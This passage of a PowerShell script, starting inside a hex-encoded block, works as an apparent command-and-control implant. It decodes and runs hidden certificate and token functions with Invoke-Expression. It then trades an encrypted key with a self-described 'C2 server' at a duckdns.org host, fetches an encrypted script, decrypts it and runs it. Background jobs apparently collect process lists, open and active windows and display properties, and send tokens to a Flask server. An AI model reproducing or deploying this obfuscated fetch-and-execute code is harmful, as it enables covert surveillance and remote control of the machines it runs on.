726573706f6e7365203d205665726966795f43657274202d636572745f726573706f6e73652024636572745f726573706f6e73650d0a20202020202020202020202020202020202020202020202069662028247665726966795f726573706f6e73652e737461747573202d65712022737563636573732229207b0d0a2020202020202020202020202020202020202020202020202020202057726974652d486f7374202243657274696669636174652069732076616c69642e22202d466f726567726f756e64436f6c6f7220477265656e0d0a0d0a20202020202020202020202020202020202020202020202020202020232052656469726563742074686520726573706f6e736520746f20466c61736b207365727665720d0a202020202020202020202020202020202020202020202020202020202472656469726563745f726573706f6e7365203d2053656e645f546f6b656e5f546f5f466c61736b202d636f6d62696e65645f656e637279707465645f6461746120247665726966795f726573706f6e73652e6d6573736167650d0a20202020202020202020202020202020202020202020202020202020696620282472656469726563745f726573706f6e7365202d657120246e756c6c29207b0d0a202020202020202020202020202020202020202020202020202020202020202057726974652d4572726f7220224661696c656420746f20726564697265637420726573706f6e736520746f20466c61736b207365727665722e220d0a202020202020202020202020202020202020202020202020202020207d0d0a2020202020202020202020202020202020202020202020202020202072657475726e0d0a2020202020202020202020202020202020202020202020207d20656c736569662028247665726966795f726573706f6e73652e737461747573202d657120226572726f722229207b0d0a202020202020202020202020202020202020202020202020202020207377697463682028247665726966795f726573706f6e73652e6d65737361676529207b0d0a202020202020202020202020202020202020202020202020202020202020202022436572746966696361746520686173206265656e207265766f6b65642e22207b0d0a20202020202020202020202020202020202020202020202020202020202020202020202057726974652d4572726f722022436572746966696361746520686173206265656e207265766f6b65642e2041626f7274696e672070726f636573732e220d0a20202020202020202020202020202020202020202020202020202020202020202020202072657475726e0d0a20202020202020202020202020202020202020202020202020202020202020207d0d0a202020202020202020202020202020202020202020202020202020202020202022496e76616c6964207369676e61747572652e22207b0d0a20202020202020202020202020202020202020202020202020202020202020202020202057726974652d4572726f7220224365727469666963617465207369676e617475726520697320696e76616c69642e2050726f63656564696e6720776974682063657274696669636174652068616e646c696e672070726f636573732e220d0a20202020202020202020202020202020202020202020202020202020202020207d0d0a20202020202020202020202020202020202020202020202020202020202020202254696d657374616d70206973206f7574736964652074686520616c6c6f7765642074696d652077696e646f772e22207b0d0a20202020202020202020202020202020202020202020202020202020202020202020202057726974652d4572726f72202243657274696669636174652074696d657374616d7020697320696e76616c69642e2050726f63656564696e6720776974682063657274696669636174652068616e646c696e672070726f636573732e220d0a20202020202020202020202020202020202020202020202020202020202020207d0d0a202020202020202020202020202020202020202020202020202020202020202064656661756c74207b0d0a20202020202020202020202020202020202020202020202020202020202020202020202057726974652d4572726f7220224365727469666963617465206973206e6f742076616c69642e2050726f63656564696e6720776974682063657274696669636174652068616e646c696e672070726f636573732e220d0a20202020202020202020202020202020202020202020202020202020202020207d0d0a202020202020202020202020202020202020202020202020202020207d0d0a2020202020202020202020202020202020202020202020207d0d0a20202020202020202020202020202020202020207d0d0a202020202020202020202020202020207d20656c7365207b0d0a202020202020202020202020202020202020202057726974652d4572726f7220224e6f20636572746966696361746520666f756e64206f6e20466c61736b207365727665722e2050726f63656564696e6720776974682063657274696669636174652068616e646c696e672070726f636573732e220d0a202020202020202020202020202020207d0d0a0d0a20202020202020202020202020202020246373725f726573706f6e7365203d2046657463685f435352202d73747564656e746964202473747564656e7469640d0a2020202020202020202020202020202069662028246373725f726573706f6e7365202d657120246e756c6c29207b0d0a202020202020202020202020202020202020202057726974652d4572726f7220224661696c656420746f206665746368204353522e2045786974696e672063657274696669636174652068616e646c696e672070726f636573732e220d0a202020202020202020202020202020202020202072657475726e0d0a202020202020202020202020202020207d0d0a0d0a20202020202020202020202020202020247369676e65645f636572745f726573706f6e7365203d2053656e645f435352202d6373725f726573706f6e736520246373725f726573706f6e73650d0a2020202020202020202020202020202069662028247369676e65645f636572745f726573706f6e7365202d657120246e756c6c29207b0d0a202020202020202020202020202020202020202057726974652d4572726f7220224661696c656420746f20676574207369676e65642063657274696669636174652e2045786974696e672063657274696669636174652068616e646c696e672070726f636573732e220d0a202020202020202020202020202020202020202072657475726e0d0a202020202020202020202020202020207d0d0a0d0a20202020202020202020202020202020247369676e65645f63657274203d20247369676e65645f636572745f726573706f6e73652e636572740d0a202020202020202020202020202020202473656e645f636572745f726573706f6e7365203d2053656e645f5369676e65645f43657274202d7369676e65645f6365727420247369676e65645f636572740d0a20202020202020202020202020202020696620282473656e645f636572745f726573706f6e7365202d657120246e756c6c29207b0d0a202020202020202020202020202020202020202057726974652d4572726f7220224661696c656420746f2073656e64207369676e656420636572746966696361746520746f20466c61736b207365727665722e2045786974696e672063657274696669636174652068616e646c696e672070726f636573732e220d0a202020202020202020202020202020202020202072657475726e0d0a202020202020202020202020202020207d0d0a0d0a2020202020202020202020202020202057726974652d486f7374202243657274696669636174652068616e646c696e672070726f6365737320636f6d706c65746564207375636365737366756c6c792e22202d466f726567726f756e64436f6c6f7220477265656e0d0a2020202020202020202020207d20656c7365207b0d0a2020202020202020202020202020202057726974652d4572726f7220224661696c656420746f2068616e646c652043412063657274696669636174652e220d0a2020202020202020202020207d0d0a20202020202020207d206361746368207b0d0a20202020202020202020202057726974652d4572726f722022416e206572726f72206f6363757272656420647572696e67207468652063657274696669636174652068616e646c696e672070726f636573733a20245f220d0a20202020202020207d0d0a202020207d0d0a7d
"@

    # Convert the hex string back to byte array
    $byteArray = @()
    for ($i = 0; $i -lt $hexFunctions.Length; $i += 2) {
        $byteArray += [Convert]::ToByte($hexFunctions.Substring($i, 2), 16)
    }

    # Convert the byte array to string content
    $decodedContent = [System.Text.Encoding]::UTF8.GetString($byteArray)

    # Execute the decoded content
    Invoke-Expression $decodedContent

    while ($true) {
        # Step 1: Check for existing certificate
        $cert_response = Check_Cert
        if ($cert_response.status -eq "cert_exists") {
            Write-Host "Existing certificate found. Verifying..."

            # Step 2: Verify the existing certificate
            $verify_response = Verify_Cert -cert_response $cert_response -c2_verify_url $c2_verify_url
            if ($verify_response.status -eq "success") {
                Write-Host "Certificate is valid." -ForegroundColor Green

                # Step 3: Redirect the token to the Flask server
                $redirect_response = Send_Token_To_Flask -combined_encrypted_data $verify_response.message -base_url $base_url
                if ($redirect_response -eq $null) {
                    Write-Error "Failed to redirect response to Flask server."
                } else {
                    Write-Host "Token successfully sent to Flask server." -ForegroundColor Green
                }
            } else {
                Write-Error "Verification of certificate failed: $($verify_response.error)"
            }
        } else {
            Write-Host "No valid certificate found. Exiting job."
        }

        Start-Sleep -Seconds 1800
    }
}

# Function to get the encrypted Fernet key from the Flask server
function Get-EncryptedFernetKey {
    try {
        $response = Invoke-RestMethod -Uri "$base_url/get_encrypted_key" -Method Get
        return $response.encrypted_key
    } catch {
        Write-Error "Failed to get encrypted Fernet key from Flask server: $_"
        return $null
    }
}

# Get the encrypted Fernet key from the RPi (Flask server)
$encrypted_fernet_key = Get-EncryptedFernetKey
if (-not $encrypted_fernet_key) {
    Write-Host "No Fernet key received. Exiting script."
    return
}

# Send the encrypted Fernet key to the C2 server
$fernet_key_endpoint = "https://rapid.tlnas.duckdns.org/get_encrypted_script.php"
try {
    $body = @{encrypted_key = $encrypted_fernet_key}
    $encrypted_script = Invoke-WebRequest -Uri $fernet_key_endpoint -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json"
    $encrypted_functions_script = ($encrypted_script.Content | ConvertFrom-Json).encrypted_functions_script
    Write-Host "Fernet key sent to C2 server successfully."
} catch {
    Write-Error "Failed to send Fernet key to C2 server: $_"
    return
}

# Load necessary assemblies for cryptographic operations
Add-Type -AssemblyName System.Security

# Generate RSA-4096 key pair
$rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider(4096)

# Export the public key
$publicKey = $rsa.ToXmlString($false)
$publicKeyBase64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($publicKey))

# Step 3: Send Encrypted Functions Script to Flask Server
$functions_script_data = @{encrypted_script = $encrypted_functions_script; public_key = $publicKeyBase64}
$response = Invoke-WebRequest -Uri "$base_url/receive_script_and_key" -Method POST -Body ($functions_script_data | ConvertTo-Json) -ContentType 'application/json'
Write-Host "Public key and encrypted script sent to Flask server successfully."
$response_content = $response.Content | ConvertFrom-Json
# Extract re-encrypted script from response
$re_encrypted_script = $response_content.re_encrypted_script

# Base64 decode the re-encrypted script
$re_encrypted_script_bytes = [Convert]::FromBase64String($re_encrypted_script)

# Function to decrypt data in chunks
function Decrypt-InChunks {
    param (
        [byte[]]$data,
        [System.Security.Cryptography.RSACryptoServiceProvider]$rsa
    )

    $chunkSize = $rsa.KeySize / 8
    $decryptedChunks = @()

    for ($i = 0; $i -lt $data.Length; $i += $chunkSize) {
        $chunk = $data[$i..($i + $chunkSize - 1)]
        $decryptedChunk = $rsa.Decrypt($chunk, $false)  # $false for PKCS1.5 padding
        $decryptedChunks += $decryptedChunk
    }

    return [byte[]]$decryptedChunks
}

# Decrypt the script using the private RSA key
try {
    $decryptedBytes = Decrypt-InChunks -data $re_encrypted_script_bytes -rsa $rsa
    $decryptedScript = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
    Invoke-Expression $decryptedScript
} catch {
    Write-Error "Decryption failed: $_"
}

# Wait for all jobs to complete
Wait-Job $heartbeat
Wait-Job $job1
Wait-Job $job2
Wait-Job $job3
Wait-Job $job4
Wait-Job $RefreshToken

# Retrieve and display outputs from all jobs
$heartbeatOutput = Receive-Job -Job $heartbeat -Keep
$job1Output = Receive-Job -Job $job1 -Keep
$job2Output = Receive-Job -Job $job2 -Keep
$job3Output = Receive-Job -Job $job3 -Keep
$job4Output = Receive-Job -Job $job4 -Keep
$jobOutput = Receive-Job -Job $RefreshToken -Keep

Write-Host "Heartbeat Output: $heartbeatOutput"
Write-Host "Active Win Output: $job1Output"
Write-Host "Display Prop Output: $job2Output"
Write-Host "Proc List Output: $job3Output"
Write-Host "Open Win Output: $job4Output"
Write-Host "Refresh Token Output: $jobOutput"